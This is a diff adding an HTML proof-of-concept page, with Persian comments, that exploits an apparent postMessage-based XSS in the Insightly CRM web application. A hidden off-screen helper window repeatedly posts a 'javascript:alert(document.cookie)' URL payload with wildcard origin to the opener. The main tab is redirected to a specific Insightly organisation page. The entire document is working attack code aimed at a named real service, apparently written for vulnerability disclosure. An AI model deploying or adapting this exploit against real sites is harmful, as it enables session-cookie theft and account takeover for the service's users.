@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="fa">
+<head>
+  <meta charset="UTF-8">
+  <title>PoC Tester</title>
+  <style>
+    body { display:flex; justify-content:center; align-items:center; height:100vh; margin:0; background:#0d1117; color:#c9d1d9; font-family:monospace; }
+    button { padding:14px 28px; font-size:16px; cursor:pointer; background:#238636; color:#fff; border:none; border-radius:6px; }
+    #log { position:fixed; bottom:20px; left:20px; right:20px; max-height:120px; overflow:auto; background:#161b22; padding:10px; font-size:13px; border-radius:6px; }
+  </style>
+</head>
+<body>
+  <button onclick="run()">🚀 اجرای PoC</button>
+  <div id="log"></div>
+
+  <script>
+    const TARGET = "https://crm.na1.insightly.com/list/Organisation/ALL?blade=/details/organisation/174120691";
+    const PAYLOAD = "javascript:alert(document.cookie)";
+
+    function log(msg) {
+      const d = document.getElementById('log');
+      d.innerHTML += `[${new Date().toLocaleTimeString()}] ${msg}<br>`;
+    }
+
+    function run() {
+      // ۱. باز کردن پنجره کمکی (حتماً باید اولین خط داخل onclick باشد)
+      const helper = window.open('', '_blank', 'width=1,height=1,left=-9999,top=-9999');
+      if (!helper) { log('❌ پاپ‌آپ بلاک شد. لطفاً Allow Popups را فعال کنید.'); return; }
+      log('✅ Helper باز شد.');
+
+      // ۲. تزریق اسکریپت ارسال پیام به Helper
+      helper.document.write(`
+        <script>
+          setTimeout(() => {
+            for (let i = 0; i < 10; i++) {
+              setTimeout(() => {
+                window.opener?.postMessage({ url: "${PAYLOAD}" }, "*");
+              }, i * 800);
+            }
+          }, 2500); // صبر تا لود کامل صفحه هدف
+        <\/script>
+      `);
+      helper.document.close();
+
+      // ۳. ریدایرکت تب اصلی به هدف
+      log('🔄 ریدایرکت به Target...');
+      location.href = TARGET;
+    }
+  </script>
+</body>
+</html>
